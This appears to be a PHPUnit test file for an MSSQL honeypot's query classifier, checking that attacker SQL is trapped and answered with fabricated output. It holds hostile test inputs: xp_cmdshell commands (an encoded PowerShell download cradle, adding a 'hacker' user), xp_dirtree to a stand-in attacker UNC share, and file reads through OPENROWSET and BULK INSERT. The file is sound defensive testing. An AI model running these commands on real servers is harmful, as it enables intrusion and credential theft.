<?php

declare(strict_types=1);

namespace Funnypot\Tests\Protocol\Mssql;

use Funnypot\Protocol\Mssql\MssqlConfig;
use Funnypot\Protocol\Mssql\MssqlQueryEngine;
use Funnypot\Protocol\Mssql\MssqlSession;
use PHPUnit\Framework\TestCase;

/**
 * Unit tests for the pure classifier: no sockets, no server, just SQL text in and a fabricated
 * response value object out.
 */
final class MssqlEngineTest extends TestCase
{
    private function engine(?MssqlConfig $c = null): MssqlQueryEngine
    {
        return new MssqlQueryEngine($c ?? new MssqlConfig(serverName: 'SQL01', personaSeed: 'seed-a'));
    }

    private function session(): MssqlSession
    {
        $s = new MssqlSession('198.51.100.5', 1433, 1);
        $s->authUser = 'sa';
        $s->currentDb = 'master';
        $s->state = MssqlSession::STATE_SESSION;

        return $s;
    }

    private function eventNames(\Funnypot\Protocol\Mssql\MssqlQueryResult $r): array
    {
        return array_map(static fn ($e) => $e['event'], $r->events);
    }

    public function test_version_recon_returns_banner_row(): void
    {
        $r = $this->engine()->classify('SELECT @@version', $this->session());
        self::assertCount(1, $r->resultSets);
        self::assertCount(1, $r->resultSets[0]['rows']);
        self::assertStringContainsString('Microsoft SQL Server 2019', $r->resultSets[0]['rows'][0][0]);
        self::assertContains('mssql_query', $this->eventNames($r));
    }

    public function test_system_user_returns_auth_user(): void
    {
        $r = $this->engine()->classify('select system_user', $this->session());
        self::assertSame([['sa']], $r->resultSets[0]['rows']);
    }

    public function test_sys_databases_one_row_per_db(): void
    {
        $cfg = new MssqlConfig(databases: ['master', 'tempdb', 'model', 'msdb', 'AppDB']);
        $r = (new MssqlQueryEngine($cfg))->classify('SELECT name, database_id FROM sys.databases', $this->session());
        self::assertSame(['name', 'database_id'], $r->resultSets[0]['columns']);
        self::assertCount(5, $r->resultSets[0]['rows']);
        self::assertSame(['master', '1'], $r->resultSets[0]['rows'][0]);
        self::assertSame(['AppDB', '5'], $r->resultSets[0]['rows'][4]);
    }

    public function test_is_srvrolemember_returns_one(): void
    {
        $r = $this->engine()->classify("SELECT is_srvrolemember('sysadmin')", $this->session());
        self::assertSame([['1']], $r->resultSets[0]['rows']);
    }

    public function test_unknown_select_is_empty_not_error(): void
    {
        $r = $this->engine()->classify('SELECT foo FROM some_random_table', $this->session());
        self::assertSame([], $r->resultSets, 'no result set (empty)');
        self::assertNull($r->rce);
        self::assertContains('mssql_query', $this->eventNames($r));
    }

    public function test_xp_cmdshell_is_trapped_with_capture_and_fake_output(): void
    {
        $r = $this->engine()->classify("EXEC xp_cmdshell 'whoami'", $this->session());
        self::assertNotNull($r->rce);
        self::assertSame('xp_cmdshell', $r->rce->proc);
        self::assertSame('whoami', $r->rce->rawArg);
        self::assertContains('mssql_rce_attempt', $this->eventNames($r));
        self::assertSame(['output'], $r->resultSets[0]['columns']);
        self::assertSame([['nt authority\\system']], $r->resultSets[0]['rows']);
    }

    public function test_powershell_enc_command_captured_verbatim_null_output(): void
    {
        $payload = 'powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAKABJAFcAUgApAA==';
        $r = $this->engine()->classify("EXEC xp_cmdshell '{$payload}'", $this->session());
        self::assertSame($payload, $r->rce->rawArg, 'the full C2 command is captured verbatim');
        // A download cradle writes no stdout: a single NULL row.
        self::assertSame([[null]], $r->resultSets[0]['rows']);
    }

    public function test_doubled_quotes_in_command_are_unescaped(): void
    {
        $r = $this->engine()->classify("EXEC xp_cmdshell 'echo ''hi'''", $this->session());
        self::assertSame("echo 'hi'", $r->rce->rawArg);
    }

    public function test_variable_command_is_resolved_from_batch(): void
    {
        $batch = "DECLARE @cmd nvarchar(200); SET @cmd = 'net user hacker P@ss /add'; EXEC xp_cmdshell @cmd";
        $r = $this->engine()->classify($batch, $this->session());
        self::assertSame('net user hacker P@ss /add', $r->rce->rawArg);
    }

    public function test_sp_configure_enable_xp_cmdshell_flags_and_infos(): void
    {
        $r = $this->engine()->classify("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE", $this->session());
        self::assertTrue($r->enableXpCmdshell);
        self::assertContains('mssql_rce_attempt', $this->eventNames($r));
        self::assertStringContainsString('changed from 0 to 1', $r->infoMessages[0]['text']);
        self::assertSame(5457, $r->infoMessages[0]['number']);
    }

    public function test_show_advanced_options_is_setup_not_critical(): void
    {
        $r = $this->engine()->classify("EXEC sp_configure 'show advanced options', 1", $this->session());
        self::assertContains('mssql_query', $this->eventNames($r));
        self::assertNotContains('mssql_rce_attempt', $this->eventNames($r));
    }

    public function test_xp_dirtree_unc_target_captured(): void
    {
        $r = $this->engine()->classify("EXEC master..xp_dirtree '\\\\attacker.evil\\share'", $this->session());
        self::assertSame('xp_dirtree', $r->rce->proc);
        self::assertSame('\\\\attacker.evil\\share', $r->rce->rawArg);
        self::assertContains('mssql_rce_attempt', $this->eventNames($r));
        // Never enumerated: an empty result set.
        self::assertSame([], $r->resultSets[0]['rows']);
    }

    public function test_openrowset_and_bulk_insert_captured(): void
    {
        $ro = $this->engine()->classify("SELECT * FROM OPENROWSET(BULK 'C:\\secret.txt', SINGLE_CLOB) x", $this->session());
        self::assertSame('openrowset', $ro->rce->proc);

        $bi = $this->engine()->classify("BULK INSERT dbo.t FROM 'C:\\loot.csv'", $this->session());
        self::assertSame('bulk_insert', $bi->rce->proc);
        self::assertSame('C:\\loot.csv', $bi->rce->rawArg);
    }

    public function test_whole_batch_scan_catches_xp_cmdshell_as_later_statement(): void
    {
        $batch = "SET NOCOUNT ON; SELECT @@version; EXEC sp_configure 'show advanced options',1; EXEC xp_cmdshell 'whoami'";
        $r = $this->engine()->classify($batch, $this->session());
        self::assertNotNull($r->rce);
        self::assertSame('xp_cmdshell', $r->rce->proc);
        self::assertContains('mssql_rce_attempt', $this->eventNames($r));
    }

    public function test_semicolon_inside_command_does_not_split_it(): void
    {
        $r = $this->engine()->classify("EXEC xp_cmdshell 'ping 10.0.0.1; whoami; hostname'", $this->session());
        self::assertSame('ping 10.0.0.1; whoami; hostname', $r->rce->rawArg);
    }

    public function test_seed_is_deterministic(): void
    {
        $a = (new MssqlQueryEngine(new MssqlConfig(personaSeed: 'x')))->classify('SELECT name FROM sys.syslogins', $this->session());
        $b = (new MssqlQueryEngine(new MssqlConfig(personaSeed: 'x')))->classify('SELECT name FROM sys.syslogins', $this->session());
        self::assertSame($a->resultSets[0]['rows'], $b->resultSets[0]['rows']);
        self::assertSame('sa', $a->resultSets[0]['rows'][0][0]);
    }
}
